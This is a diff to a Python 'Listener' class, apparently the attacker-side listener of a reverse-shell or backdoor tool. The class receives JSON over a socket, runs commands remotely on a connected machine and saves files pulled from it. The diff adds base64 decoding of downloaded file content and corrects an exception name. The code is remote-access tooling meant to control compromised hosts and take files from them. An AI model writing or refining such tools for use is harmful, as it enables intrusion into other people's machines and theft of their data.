@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import socket, json
+import base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -22,7 +23,7 @@ class Listener:
             try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
-            except valueError:
+            except ValueError:
                 continue
 
     def execute_remotely(self, command):
@@ -34,7 +35,7 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful."
 
     def run(self):
